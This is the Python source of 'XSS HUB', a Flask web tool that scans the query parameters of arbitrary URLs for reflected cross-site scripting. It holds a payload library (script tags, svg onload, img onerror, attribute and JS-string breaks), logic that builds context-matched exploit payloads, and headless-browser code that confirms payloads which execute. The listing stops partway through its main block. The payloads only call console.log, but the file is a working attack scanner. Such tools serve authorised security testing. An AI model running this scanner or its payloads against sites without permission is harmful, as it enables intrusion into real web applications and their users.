#!/usr/bin/env python3
"""
XSS HUB — backend scanner with editable payload config.

Routes:
  GET  /                  → dashboard
  GET  /config            → payload configuration UI
  GET  /api/config        → returns the saved payload list
  POST /api/config        → replaces the saved payload list
  POST /api/config/reset  → restores defaults
  POST /api/scan          → NDJSON-streamed scan
  GET  /api/health        → liveness check

Payloads are persisted in ./payloads.json (next to this file).
"""
from __future__ import annotations  # Python 3.9 compat for `str | None` hints

import json
import os
import re
import secrets
import string
import tempfile
import threading
import warnings
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

import requests
from bs4 import BeautifulSoup
from flask import Flask, Response, request, send_from_directory, jsonify
from urllib3.exceptions import InsecureRequestWarning

# Playwright is optional — only needed when the PoC feature is used
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout  # type: ignore
    PLAYWRIGHT_AVAILABLE = True
    PLAYWRIGHT_IMPORT_ERROR = None
except Exception as _e:  # ImportError or platform issues
    PLAYWRIGHT_AVAILABLE = False
    PLAYWRIGHT_IMPORT_ERROR = str(_e)

warnings.filterwarnings("ignore", category=InsecureRequestWarning)

# ---------------------------------------------------------------------------
# PoC-phase payload library
# ---------------------------------------------------------------------------
# Each payload tries to call console.log(1337) in a particular escape context.
# Some fire on page load (script tags, autofocus), others need a DOM event
# dispatched — poc_param handles both with a two-step check.
DEFAULT_POC_PAYLOADS = [
    # --- Script tags (fire on page load) ---
    "<script>console.log(1337)</script>",
    '"><script>console.log(1337)</script>',
    "'><script>console.log(1337)</script>",

    # --- Auto-firing tags (fire on page load) ---
    "<svg onload=console.log(1337)>",
    '"><svg onload=console.log(1337)>',
    "'><svg onload=console.log(1337)>",
    "<img src=x onerror=console.log(1337)>",
    '"><img src=x onerror=console.log(1337)>',
    "<input onfocus=console.log(1337) autofocus>",
    '"><input onfocus=console.log(1337) autofocus>',
    "<details ontoggle=console.log(1337) open>",

    # --- Attribute-injection event handlers (need event dispatch) ---
    '" onmouseover="console.log(1337)" x="',
    "' onmouseover='console.log(1337)' x='",
    '" onfocus="console.log(1337)" autofocus="',
    "' onfocus='console.log(1337)' autofocus='",
    '" onclick="console.log(1337)" x="',
    "' onclick='console.log(1337)' x='",
    '" onerror="console.log(1337)" x="',

    # --- JS-string break ---
    "';console.log(1337);//",
    '";console.log(1337);//',
]


def synthesize_from_breaks(broken_payloads: list) -> list:
    """Derive context-matching event-handler payloads from the payloads that
    actually broke. This is the heuristic 'smart synthesis' step — it looks at
    each broken payload and produces red flags that share its escape pattern but
    swap in event handlers, so we test exploitable forms specific to the sink."""
    extras = []
    seen = set()

    def add(p):
        if p not in seen:
            seen.add(p)
            extras.append(p)

    for bp in broken_payloads or []:
        if not isinstance(bp, str) or not bp:
            continue
        low = bp.lower()

        # Pattern: attribute injection inside double-quoted attr  (` data-fqprobe="`)
        if '"' in bp and ('data-fqprobe' in low or 'data-' in low):
            for ev in ("onmouseover", "onfocus", "onclick", "onerror", "onmouseenter"):
                add(f'" {ev}="console.log(1337)" x="')
            add('" autofocus onfocus="console.log(1337)" x="')

        # Pattern: attribute injection inside single-quoted attr
        if "'" in bp and ('data-fqprobe' in low or 'data-' in low):
            for ev in ("onmouseover", "onfocus", "onclick", "onerror", "onmouseenter"):
                add(f"' {ev}='console.log(1337)' x='")
            add("' autofocus onfocus='console.log(1337)' x='")

        # Pattern: attribute → tag break (double-quoted)  `"><...`
        if '">' in bp:
            for snippet in (
                '"><svg onload=console.log(1337)>',
                '"><img src=x onerror=console.log(1337)>',
                '"><input onfocus=console.log(1337) autofocus>',
                '"><details ontoggle=console.log(1337) open>',
                '"><body onload=console.log(1337)>',
            ):
                add(snippet)

        # Pattern: attribute → tag break (single-quoted)
        if "'>" in bp:
            for snippet in (
                "'><svg onload=console.log(1337)>",
                "'><img src=x onerror=console.log(1337)>",
                "'><input onfocus=console.log(1337) autofocus>",
            ):
                add(snippet)

        # Pattern: raw body tag break (e.g. `<faique>`)
        if bp.startswith("<") and not bp.startswith("</") and not bp.lower().startswith("<script"):
            for snippet in (
                "<svg onload=console.log(1337)>",
                "<img src=x onerror=console.log(1337)>",
                "<input onfocus=console.log(1337) autofocus>",
                "<details ontoggle=console.log(1337) open>",
            ):
                add(snippet)

        # Pattern: closing tag break — could be inside <script> or <style>
        if bp.startswith("</"):
            add("</script><script>console.log(1337)</script>")
            add("</style><svg onload=console.log(1337)>")

        # Pattern: JS string break (single)
        if bp.startswith("'") and bp.endswith("'") and "__FQJS_RANDOM__" not in bp:
            add("';console.log(1337);//")
            add("';console.log(1337);'")

        # Pattern: JS string break (double)
        if bp.startswith('"') and bp.endswith('"') and "__FQJS_RANDOM__" not in bp:
            add('";console.log(1337);//')
            add('";console.log(1337);"')

    return extras


# JS dispatched in the headless browser to fire common DOM events on every
# element. This is what makes onmouseover / onclick / onfocus payloads trigger
# without an actual human moving a mouse.
EVENT_DISPATCH_JS = r"""
() => {
  const all = document.querySelectorAll('*');
  const generic = ['mouseover','mouseenter','mouseout','mouseleave','focus','focusin',
                   'blur','load','error','input','change','toggle',
                   'animationstart','animationend','keydown','keyup','keypress'];
  generic.forEach(t => all.forEach(el => {
    try { el.dispatchEvent(new Event(t, {bubbles:true, cancelable:true})); } catch(_) {}
  }));
  // Mouse events need MouseEvent constructor for some handlers
  ['mouseover','mouseenter','mousedown','mouseup','click','dblclick'].forEach(t => {
    all.forEach(el => {
      try { el.dispatchEvent(new MouseEvent(t, {bubbles:true, cancelable:true, view:window})); } catch(_) {}
    });
  });
  // Pointer events (modern equivalents)
  ['pointerover','pointerenter','pointerdown','pointerup'].forEach(t => {
    all.forEach(el => {
      try { el.dispatchEvent(new PointerEvent(t, {bubbles:true, cancelable:true})); } catch(_) {}
    });
  });
  // Direct calls — most reliable for autofocus + click
  document.querySelectorAll('input,textarea,select,a,button,[tabindex],[autofocus]').forEach(el => {
    try { el.focus(); } catch(_) {}
    try { el.click(); } catch(_) {}
  });
}
"""

app = Flask(__name__, static_folder=None)

# ---------------------------------------------------------------------------
# Persistent payload config
# ---------------------------------------------------------------------------
HERE = os.path.dirname(os.path.abspath(__file__))
CONFIG_PATH = os.path.join(HERE, "payloads.json")
CONFIG_LOCK = threading.Lock()

DEFAULT_PAYLOADS = [
    # Each payload has an `enabled` flag (default True). When the user disables
    # a payload via the /config UI, it's skipped entirely — no base test, no
    # red flags, no poc candidates derived from it.
    # Each red flag is a console.log(1337) PoC matching the base's escape
    # context. When the base breaks, the red flag is the actual exploit
    # payload — if it reflects verbatim, the XSS will fire in a browser.
    {"id": "p1", "tpl": '"><faique>',          "ctx": "attribute → tag (double-quoted)",      "enabled": True, "replacements": ['"><script>console.log(1337)</script>']},
    {"id": "p2", "tpl": "'><faique>",          "ctx": "attribute → tag (single-quoted)",      "enabled": True, "replacements": ["'><script>console.log(1337)</script>"]},
    {"id": "p3", "tpl": '""><faique>',         "ctx": "attribute → tag (double-double)",      "enabled": True, "replacements": ['""><script>console.log(1337)</script>']},
    {"id": "p4", "tpl": "<faique>",            "ctx": "raw HTML body",                        "enabled": True, "replacements": ['<script>console.log(1337)</script>']},
    {"id": "p5", "tpl": "</faique>",           "ctx": "raw HTML close tag",                   "enabled": True, "replacements": ['</script><script>console.log(1337)</script>']},
    {"id": "p6", "tpl": '" data-fqprobe="1',   "ctx": "attribute injection (double-quoted)",  "enabled": True, "replacements": ['" onmouseover="console.log(1337)" x="1']},
    {"id": "p7", "tpl": "' data-fqprobe='1",   "ctx": "attribute injection (single-quoted)",  "enabled": True, "replacements": ["' onmouseover='console.log(1337)' x='1"]},
    {"id": "p8", "tpl": "'__FQJS_RANDOM__'",   "ctx": "JS string break (single-quoted)",      "enabled": True, "replacements": ["';console.log(1337)//"]},
    {"id": "p9", "tpl": '"__FQJS_RANDOM__"',   "ctx": "JS string break (double-quoted)",      "enabled": True, "replacements": ['";console.log(1337)//']},
]


def _save_unlocked(payloads: list) -> None:
    fd, tmp = tempfile.mkstemp(dir=os.path.dirname(CONFIG_PATH) or ".", suffix=".tmp")
    try:
        with os.fdopen(fd, "w") as f:
            json.dump(payloads, f, indent=2, ensure_ascii=False)
        os.replace(tmp, CONFIG_PATH)
    except Exception:
        try:
            os.unlink(tmp)
        except OSError:
            pass
        raise


def load_config() -> list:
    """Read payload config from disk; create with defaults if missing/corrupt."""
    with CONFIG_LOCK:
        if not os.path.exists(CONFIG_PATH):
            _save_unlocked(DEFAULT_PAYLOADS)
            return [dict(p) for p in DEFAULT_PAYLOADS]
        try:
            with open(CONFIG_PATH) as f:
                data = json.load(f)
            if isinstance(data, list):
                for p in data:
                    if isinstance(p, dict):
                        p.setdefault("replacements", [])
                        # Backwards-compat: payloads without `enabled` are on by default
                        p.setdefault("enabled", True)
                return data
            print(f"[warn] {CONFIG_PATH} is not a list, using defaults")
        except Exception as e:
            print(f"[warn] cannot read {CONFIG_PATH}: {e}, using defaults")
        return [dict(p) for p in DEFAULT_PAYLOADS]


def save_config(payloads: list) -> None:
    with CONFIG_LOCK:
        _save_unlocked(payloads)


# ---------------------------------------------------------------------------
# Detection knowledge base — common HTML tags/attrs we don't false-flag on
# ---------------------------------------------------------------------------
COMMON_TAGS = set("""
html head body div span a p img input form br hr table tr td th thead tbody tfoot
ul ol li dl dt dd h1 h2 h3 h4 h5 h6 label button select option textarea fieldset legend
iframe nav header footer section article main aside video audio canvas svg path g
title b i u strong em small code pre blockquote script style meta link noscript template
slot abbr address area base bdi bdo caption cite col colgroup data datalist del details
dfn dialog embed figcaption figure ins kbd map mark meter object optgroup output param
picture progress q rp rt ruby s samp source sub summary sup time track var wbr menu
center font marquee circle rect line polygon polyline ellipse text tspan defs use clippath
mask pattern image filter foreignobject animate animatemotion animatetransform set
""".split())

COMMON_ATTRS = set("""
id class name value type href src alt title style rel target for action method placeholder
checked selected disabled readonly required autofocus tabindex role lang dir draggable
hidden translate contenteditable spellcheck accept accesskey autocomplete media size
maxlength minlength pattern step min max rows cols colspan rowspan wrap form list multiple
novalidate loop muted controls preload poster kind srclang label default open reversed
start scope headers abbr datetime cite loading decoding crossorigin integrity
referrerpolicy ping download hreflang shape coords usemap ismap longdesc sizes srcset
async defer nonce charset content data width height bgcolor border align valign
onclick onmouseover onmouseout onmousedown onmouseup onkeydown onkeyup onkeypress
onfocus onblur onchange onsubmit onload onerror oninput onwheel oncopy onpaste oncut
fill stroke transform points cx cy r rx ry x y x1 y1 x2 y2 d viewbox preserveaspectratio
""".split())

DEFAULT_TIMEOUT = 15
DEFAULT_PAYLOAD_WORKERS = 4


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def rnd(length: int = 10) -> str:
    alphabet = string.ascii_lowercase + string.digits
    return "fq" + "".join(secrets.choice(alphabet) for _ in range(length))


def parse_headers(text: str) -> dict:
    out = {}
    if not text:
        return out
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or ":" not in line:
            continue
        k, v = line.split(":", 1)
        out[k.strip()] = v.strip()
    return out


def fetch(url: str, follow: bool, timeout: int, headers: dict, proxy: str | None = None):
    base = {
        "User-Agent": "xss-hub/2.2 (security-testing)",
        "Accept": "text/html,application/xhtml+xml,*/*",
    }
    base.update(headers or {})
    proxies = None
    if proxy:
        proxy = proxy.strip()
        if proxy:
            proxies = {"http": proxy, "https": proxy}
    return requests.get(url, allow_redirects=follow, timeout=timeout, verify=False,
                        headers=base, proxies=proxies)


def replace_param(url: str, key: str, value: str) -> str:
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[key] = [value]
    new_query = urlencode(qs, doseq=True, quote_via=quote)
    return urlunparse(parsed._replace(query=new_query))


def materialize(tpl: str):
    """Replace __FQJS_RANDOM__ with a fresh token. Returns (final_payload, token_or_None)."""
    if "__FQJS_RANDOM__" in tpl:
        token = rnd(8)
        return tpl.replace("__FQJS_RANDOM__", token), token
    return tpl, None


# ---------------------------------------------------------------------------
# Generic detection — works for ANY custom tag or attribute, not just <faique>
# ---------------------------------------------------------------------------
TAG_RE = re.compile(r"<\s*/?\s*([a-zA-Z][a-zA-Z0-9_-]*)")
ATTR_RE = re.compile(r"(?:^|[\s>'\"/])\s*([a-zA-Z][a-zA-Z0-9:_-]*)\s*=")


def fingerprint_dom(soup_or_html) -> dict:
    """Build a structural fingerprint of a parsed DOM.

    Counts every tag name and every (tag, attr) pair so we can later compare
    a baseline response (no payload) to a payload response and detect tags
    or attributes that were *injected* by the payload — even when those
    tag/attr names are perfectly standard HTML (img, script, onclick,
    autofocus, etc.) that the simple tag/attr blacklist passes wave through.

    Returns: {"tags": {name: count}, "attrs": {(tag, attr): count}}
    """
    if not isinstance(soup_or_html, BeautifulSoup):
        soup_or_html = BeautifulSoup(soup_or_html or "", "html.parser")
    tags: dict = {}
    attrs: dict = {}
    for tag in soup_or_html.find_all():
        name = tag.name
        tags[name] = tags.get(name, 0) + 1
        for attr_name in tag.attrs:
            key = (name, attr_name.lower())
            attrs[key] = attrs.get(key, 0) + 1
    return {"tags": tags, "attrs": attrs}


def detect_break(html: str, payload: str, js_token: str | None = None,
                 baseline_fingerprint: dict | None = None) -> dict:
    """Decide whether a payload broke its escaping context.

    Strategy (in order — first match wins):
      0. PoC payloads containing the literal "console.log(1337)" that survive
         verbatim in the response — strong execution signal.
      1. Custom (non-standard) tags from the payload that show up parsed in
         the DOM — clear context break.
      2. **Differential tag injection** — when a baseline fingerprint is
         supplied, any *standard* tag named in the payload (img, script,
         iframe, …) whose count in the response exceeds the baseline is
         treated as injected. Catches `"><img src=x>` and friends.
      3. Custom (non-standard) attributes that end up on real elements.
      4. **Differential attribute injection** — same idea for attributes.
         Catches `" autofocus`, `" onclick=…` against standard handlers.
      5. JS string-token break: random token reflected inside <script> with
         the payload's quotes intact.
      6. Static fallback: quoted payload reflected verbatim inside <script>.
    """
    # 0. console.log(1337) PoC reflection — fires before tag/attr parsing
    #    because the payload may use only standard tags (script, img) which
    #    the tag/attr passes would otherwise skip as "common".
    if "console.log(1337)" in payload and payload in html:
        return {
            "broken": True,
            "reason": "console.log(1337) PoC payload reflected verbatim",
        }

    soup = BeautifulSoup(html, "html.parser")

    # 1. Custom (non-standard) tag detection
    custom_tags = {t.lower() for t in TAG_RE.findall(payload)}
    custom_tags -= COMMON_TAGS
    for tag in custom_tags:
        els = soup.find_all(tag)
        if els:
            n = len(els)
            return {
                "broken": True,
                "reason": f"<{tag}> tag parsed as DOM element ({n} occurrence{'s' if n > 1 else ''})",
            }

    # 2. Differential tag injection — catches standard tags
    payload_fp = None  # lazy compute, also reused by step 4
    if baseline_fingerprint is not None and "<" in payload:
        payload_fp = fingerprint_dom(soup)
        all_payload_tags = {t.lower() for t in TAG_RE.findall(payload)}
        for tag_name in all_payload_tags:
            base_count = baseline_fingerprint["tags"].get(tag_name, 0)
            now_count = payload_fp["tags"].get(tag_name, 0)
            if now_count > base_count:
                return {
                    "broken": True,
                    "reason": (
                        f"<{tag_name}> tag injected via context break "
                        f"(baseline {base_count} → after payload {now_count})"
                    ),
                }

    # 3. Custom (non-standard) attribute detection
    custom_attrs = {a.lower() for a in ATTR_RE.findall(payload)}
    custom_attrs -= COMMON_ATTRS
    for attr in custom_attrs:
        els = soup.find_all(attrs={attr: True})
        if els:
            return {
                "broken": True,
                "reason": f"{attr} attribute injected onto <{els[0].name}>",
            }

    # 4. Differential attribute injection — catches standard attrs/handlers
    if baseline_fingerprint is not None:
        all_payload_attrs = {a.lower() for a in ATTR_RE.findall(payload)}
        if all_payload_attrs:
            if payload_fp is None:
                payload_fp = fingerprint_dom(soup)
            for (tag_name, attr_name), now_count in payload_fp["attrs"].items():
                if attr_name not in all_payload_attrs:
                    continue
                base_count = baseline_fingerprint["attrs"].get((tag_name, attr_name), 0)
                if now_count > base_count:
                    return {
                        "broken": True,
                        "reason": (
                            f"{attr_name} attribute injected onto <{tag_name}> "
                            f"(baseline {base_count} → after payload {now_count})"
                        ),
                    }

    # 5. JS-token break
    if js_token:
        for s in soup.find_all("script"):
            code = s.get_text() or ""
            if js_token in code:
                if payload in code:
                    return {"broken": True, "reason": "Reflected inside <script> with quotes intact"}
                return {"broken": False, "reason": "Token reflected in <script> but quotes were filtered"}

    # 6. Static fallback for quoted payloads in <script>
    if not js_token and ('"' in payload or "'" in payload) and not custom_tags and not custom_attrs:
        for s in soup.find_all("script"):
            code = s.get_text() or ""
            if payload in code:
                return {"broken": True, "reason": "Static payload reflected verbatim in <script>"}

    return {"broken": False, "reason": ""}


# ---------------------------------------------------------------------------
# PoC — headless-browser confirmation of executable XSS
# ---------------------------------------------------------------------------
def poc_param(url: str, param: str, follow: bool, timeout: int,
                 headers: dict, proxy: str | None = None,
                 broken_payloads: list | None = None,
                 response_snippet: str | None = None) -> dict:
    """Two-step exploit confirmation in headless Chromium.

    For each candidate payload:
      1. Load the URL → wait for any inline script / autofocus to execute.
         If `1337` is in the console here, fireType = "page_load".
      2. Dispatch every common DOM event on every element. If `1337` arrives
         after that, fireType = "event_dispatch" — handler-style payloads
         (onmouseover, onclick, onfocus, …) hit this branch.

    Returns the first payload that fires, or a clear error if none did.
    """
    if not PLAYWRIGHT_AVAILABLE:
        return {
            "verified": False, "payload": None, "testUrl": None, "fireType": None,
            "error": (
                "Playwright not installed. Run: "
                "pip3 install playwright && playwright install chromium"
            ),
        }

    # Build candidates by synthesizing from the observed breaks plus the
    # default poc payload list.
    seen = set()
    candidates = []
    synthesized = synthesize_from_breaks(broken_payloads or [])
    for p in synthesized + DEFAULT_POC_PAYLOADS:
        if p not in seen:
            seen.add(p)
            candidates.append(p)

    launch_args: dict = {"headless": True}
    if proxy:
        launch_args["proxy"] = {"server": proxy}

    try:
        with sync_playwright() as p:
            try:
                browser = p.chromium.launch(**launch_args)
            except Exception as e:
                return {
                    "verified": False, "payload": None, "testUrl": None, "fireType": None,
                    "error": f"Browser launch failed: {e}. Try: playwright install chromium",
                }

            try:
                attempts = []
                for poc_payload in candidates:
                    test_url = replace_param(url, param, poc_payload)
                    context = browser.new_context(
                        ignore_https_errors=True,
                        extra_http_headers=headers or {},
                    )
                    page = context.new_page()
                    console_messages: list = []
                    page.on("console", lambda msg: console_messages.append(str(msg.text)))
                    page.on("pageerror", lambda err: console_messages.append(f"ERROR:{err}"))

                    fire_type = None

                    # Step 1: load and let immediate-fire payloads run
                    try:
                        page.goto(
                            test_url,
                            wait_until="domcontentloaded",
                            timeout=max(2000, timeout * 1000),
                        )
                        page.wait_for_timeout(400)
                    except PWTimeout:
                        pass
                    except Exception:
                        pass

                    if _hit_1337(console_messages):
                        fire_type = "page_load"
                    else:
                        # Step 2: dispatch events on every element to trigger
                        # onmouseover / onclick / onfocus / etc.
                        try:
                            page.evaluate(EVENT_DISPATCH_JS)
                            page.wait_for_timeout(350)
                        except Exception:
                            pass
                        if _hit_1337(console_messages):
                            fire_type = "event_dispatch"

                    attempts.append({
                        "payload": poc_payload,
                        "fired": fire_type is not None,
                        "fireType": fire_type,
                    })
                    context.close()

                    if fire_type:
                        return {
                            "verified": True,
                            "payload": poc_payload,
                            "testUrl": test_url,
                            "fireType": fire_type,
                            "synthesized": len(synthesized),
                            "candidatesTried": len(attempts),
                            "error": None,
                            "attempts": attempts,
                        }

                return {
                    "verified": False,
                    "payload": None, "testUrl": None, "fireType": None,
                    "synthesized": len(synthesized),
                    "candidatesTried": len(attempts),
                    "error": None,
                    "attempts": attempts,
                }
            finally:
                browser.close()

    except Exception as e:
        return {
            "verified": False, "payload": None, "testUrl": None, "fireType": None,
            "error": f"PoC crashed: {type(e).__name__}: {e}",
        }


def _hit_1337(messages: list) -> bool:
    """Return True iff a console message contains exactly the token 1337.
    We're strict about whitespace boundaries so URLs / IDs containing 1337
    don't false-positive."""
    for m in messages:
        s = str(m).strip()
        if s == "1337" or s.endswith(" 1337") or s.startswith("1337 "):
            return True
    return False



# ---------------------------------------------------------------------------
# Scan core
# ---------------------------------------------------------------------------
def test_one(test_id: str, ctx: str, tpl: str, url: str, param: str,
             follow: bool, timeout: int, headers: dict,
             red_flag_of: str | None = None, proxy: str | None = None,
             baseline_fingerprint: dict | None = None) -> dict:
    payload, js_token = materialize(tpl)
    test_url = replace_param(url, param, payload)

    base = {"id": test_id, "ctx": ctx, "payload": payload, "testUrl": test_url}
    if red_flag_of is not None:
        base["redFlagOf"] = red_flag_of

    try:
        r = fetch(test_url, follow=follow, timeout=timeout, headers=headers, proxy=proxy)
        text = r.text
        reflected_raw = payload in text
        reflected_token = bool(js_token) and (js_token in text)
        d = detect_break(text, payload, js_token, baseline_fingerprint)
        base.update({
            "status": r.status_code,
            "reflected": reflected_raw or reflected_token,
            "broken": d["broken"],
            "reason": d["reason"] or (
                "Reflected but escaped/encoded" if (reflected_raw or reflected_token)
                else "Filtered or stripped"
            ),
        })
    except requests.exceptions.SSLError as e:
        base["error"] = f"SSL error: {e}"
    except requests.exceptions.ConnectionError:
        base["error"] = "Connection failed"
    except requests.exceptions.Timeout:
        base["error"] = f"Timeout after {timeout}s"
    except Exception as e:
        base["error"] = f"{type(e).__name__}: {e}"

    return base


def _sort_key(r: dict):
    """Sort ids like p1, p1.v0, p1.v1, p2 so p10 lands after p2."""
    return [int(x) if x.isdigit() else x for x in re.split(r"(\d+)", r["id"])]


def test_param_stream(url: str, param: str, follow: bool, timeout: int, headers: dict,
                      workers: int, deepscan: bool, payloads: list,
                      proxy: str | None = None, poc: bool = False):
    """Streaming version of test_param that yields phase-progress events as it
    runs, then yields a final {"type": "result", ...} event at the end. Lets
    the dashboard show 'running PoC via headless browser…' per URL instead of a
    generic 'scanning…'."""
    out = {"name": param, "reflected": False, "payloads": [], "error": None}

    # ---------- Phase 0: probe ----------
    yield {"type": "phase", "url": url, "param": param,
           "phase": "probe", "label": "Probing for reflection"}

    canary = rnd()
    probe_url = replace_param(url, param, canary)
    try:
        resp = fetch(probe_url, follow=follow, timeout=timeout, headers=headers, proxy=proxy)
    except requests.exceptions.ConnectionError:
        out["error"] = "Connection failed (host unreachable / proxy refused)"
        yield {"type": "result", "result": out}; return
    except requests.exceptions.ProxyError as e:
        out["error"] = f"Proxy error: {e}"
        yield {"type": "result", "result": out}; return
    except requests.exceptions.Timeout:
        out["error"] = f"Probe timed out after {timeout}s"
        yield {"type": "result", "result": out}; return
    except Exception as e:
        out["error"] = f"Probe failed: {type(e).__name__}: {e}"
        yield {"type": "result", "result": out}; return

    if canary not in resp.text:
        yield {"type": "result", "result": out}; return
    out["reflected"] = True
    probe_html = resp.text

    # Build a structural baseline of the page WITHOUT a malicious payload —
    # used by detect_break to flag injection of standard tags/attrs whose
    # names alone (img, script, onclick, autofocus, ...) wouldn't trigger
    # the static blacklist passes. Computed once, reused for every payload.
    baseline_fp = fingerprint_dom(probe_html)

    workers_eff = max(1, min(int(workers), 16))

    # ---------- Phase 1: run every base payload in parallel ----------
    # Disabled payloads (`enabled: False` in /config) are skipped entirely —
    # no base test, no red flags, no poc candidates derived from them.
    valid_payloads = [
        p for p in payloads
        if isinstance(p, dict)
        and (p.get("tpl") or "")
        and p.get("enabled", True)  # default-on for backwards compat
    ]
    yield {"type": "phase", "url": url, "param": param,
           "phase": "bases",
           "label": f"Testing {len(valid_payloads)} base payloads"}

    base_pairs = []
    with ThreadPoolExecutor(max_workers=workers_eff) as pool:
        futures = []
        for p in valid_payloads:
            pid = (p.get("id") or rnd(4)).strip()
            ctx = p.get("ctx", "")
            tpl = p.get("tpl", "")
            fut = pool.submit(
                test_one, pid, ctx, tpl, url, param,
                follow, timeout, headers, None, proxy, baseline_fp,
            )
            futures.append((fut, p))
        for fut, p in futures:
            base_pairs.append((p, fut.result()))

    base_breaks = sum(1 for _, r in base_pairs if r.get("broken"))

    # ---------- Phase 2: red flags — only for bases that BROKE ----------
    red_flag_results = []
    if deepscan:
        red_flag_tasks = []
        for (p, base_result) in base_pairs:
            if not base_result.get("broken"):
                continue
            base_id = base_result["id"]
            base_ctx = base_result["ctx"]
            base_tpl = p.get("tpl", "")
            for i, rep in enumerate(p.get("replacements") or []):
                if not rep:
                    continue
                red_flag_tasks.append((
                    f"{base_id}.v{i}",
                    f"{base_ctx} · red flag",
                    rep,
                    base_tpl,
                ))

        if red_flag_tasks:
            yield {"type": "phase", "url": url, "param": param,
                   "phase": "red_flag",
                   "label": f"Testing {len(red_flag_tasks)} red flag payloads ({base_breaks} bases broke)"}
            with ThreadPoolExecutor(max_workers=workers_eff) as pool:
                futures = [
                    pool.submit(
                        test_one, tid, c, t, url, param,
                        follow, timeout, headers, vof, proxy, baseline_fp,
                    )
                    for (tid, c, t, vof) in red_flag_tasks
                ]
                red_flag_results = [f.result() for f in futures]

    all_results = [r for (_, r) in base_pairs] + red_flag_results
    out["payloads"] = sorted(all_results, key=_sort_key)

    # ---------- Phase 3: poc — only if anything broke and poc is on ----
    any_broken = any(r.get("broken") for r in all_results)
    if poc and any_broken:
        yield {"type": "phase", "url": url, "param": param,
               "phase": "poc",
               "label": "Synthesizing PoC + running in headless browser"}
        broken_strings = [r.get("payload", "") for r in all_results if r.get("broken")]
        snippet = ""
        try:
            for r in all_results:
                if r.get("broken") and r.get("testUrl"):
                    rr = fetch(r["testUrl"], follow=follow, timeout=timeout,
                               headers=headers, proxy=proxy)
                    snippet = rr.text[:2000]
                    break
        except Exception:
            pass
        out["pocResult"] = poc_param(
            url, param, follow, timeout, headers, proxy,
            broken_payloads=broken_strings,
            response_snippet=snippet,
        )
    elif poc and not any_broken:
        out["pocResult"] = {
            "verified": False, "payload": None, "testUrl": None,
            "error": "Skipped — no breaks to poc",
        }

    yield {"type": "result", "result": out}


def test_param(url: str, param: str, follow: bool, timeout: int, headers: dict,
               workers: int, deepscan: bool, payloads: list,
               proxy: str | None = None, poc: bool = False) -> dict:
    """Non-streaming wrapper: drains test_param_stream and returns the result."""
    for ev in test_param_stream(url, param, follow, timeout, headers,
                                workers, deepscan, payloads, proxy, poc):
        if ev.get("type") == "result":
            return ev["result"]
    return {"name": param, "reflected": False, "payloads": [],
            "error": "internal: stream ended without result"}


def scan_url_stream(url: str, follow: bool, timeout: int, headers: dict,
                    workers: int, deepscan: bool, payloads: list,
                    proxy: str | None = None, poc: bool = False):
    yield {"type": "url_start", "url": url}

    try:
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            yield {"type": "url_done", "url": url, "error": "Malformed URL", "params": []}
            return
        qs = parse_qs(parsed.query, keep_blank_values=True)
    except Exception as e:
        yield {"type": "url_done", "url": url, "error": f"URL parse error: {e}", "params": []}
        return

    if not qs:
        yield {"type": "url_done", "url": url, "error": "No query parameters present", "params": []}
        return

    param_results = []
    for key in qs.keys():
        yield {"type": "param_start", "url": url, "param": key}
        result = None
        for ev in test_param_stream(url, key, follow, timeout, headers,
                                    workers, deepscan, payloads, proxy, poc):
            if ev.get("type") == "result":
                result = ev["result"]
            else:
                yield ev  # forward phase progress events
        if result is None:
            result = {"name": key, "reflected": False, "payloads": [], "error": "no result"}
        param_results.append(result)
        yield {"type": "param_done", "url": url, "result": result}

    yield {"type": "url_done", "url": url, "params": param_results, "error": None}


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------
@app.route("/")
def index():
    return send_from_directory(HERE, "index.html")


@app.route("/config")
def config_page():
    return send_from_directory(HERE, "config.html")


@app.route("/api/config", methods=["GET"])
def api_get_config():
    return jsonify({"payloads": load_config()})


@app.route("/api/config", methods=["POST"])
def api_set_config():
    data = request.get_json(force=True, silent=True) or {}
    payloads = data.get("payloads", [])
    if not isinstance(payloads, list):
        return jsonify({"error": "payloads must be a list"}), 400

    cleaned, seen_ids = [], set()
    skipped = 0
    for p in payloads:
        if not isinstance(p, dict):
            skipped += 1
            continue
        tpl = str(p.get("tpl", ""))
        if not tpl:
            skipped += 1
            continue
        pid = str(p.get("id", "") or "").strip() or rnd(4)
        if pid in seen_ids:
            pid = pid + "_" + rnd(3)
        seen_ids.add(pid)
        ctx = str(p.get("ctx", ""))
        reps = p.get("replacements") or []
        if not isinstance(reps, list):
            reps = []
        reps = [str(r) for r in reps if str(r).strip()]
        # Default to enabled if the field is absent
        enabled = bool(p.get("enabled", True))
        cleaned.append({"id": pid, "tpl": tpl, "ctx": ctx, "enabled": enabled, "replacements": reps})

    save_config(cleaned)
    return jsonify({"ok": True, "saved": len(cleaned), "skipped": skipped})


@app.route("/api/config/reset", methods=["POST"])
def api_reset_config():
    save_config([dict(p) for p in DEFAULT_PAYLOADS])
    return jsonify({"ok": True, "payloads": load_config()})


@app.route("/api/scan", methods=["POST"])
def api_scan():
    data = request.get_json(force=True, silent=True) or {}
    urls = [u.strip() for u in data.get("urls", []) if u and u.strip()]
    follow = bool(data.get("followRedirects", True))
    timeout = int(data.get("timeout") or DEFAULT_TIMEOUT)
    headers = parse_headers(data.get("headers", "") or "")
    workers = int(data.get("payloadWorkers") or DEFAULT_PAYLOAD_WORKERS)
    deepscan = bool(data.get("deepscan", False))
    poc = bool(data.get("poc", False)) and deepscan  # poc gated by deepscan
    proxy = (data.get("proxy") or "").strip() or None

    payloads = load_config()  # snapshot per scan

    def stream():
        try:
            for url in urls:
                for ev in scan_url_stream(url, follow, timeout, headers, workers,
                                          deepscan, payloads, proxy, poc):
                    yield json.dumps(ev) + "\n"
            yield json.dumps({"type": "done"}) + "\n"
        except GeneratorExit:
            return
        except Exception as e:
            yield json.dumps({"type": "fatal", "error": str(e)}) + "\n"

    return Response(stream(), mimetype="application/x-ndjson")


@app.route("/api/health")
def health():
    return {
        "ok": True,
        "version": "2.3",
        "playwright": PLAYWRIGHT_AVAILABLE,
    }


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import argparse

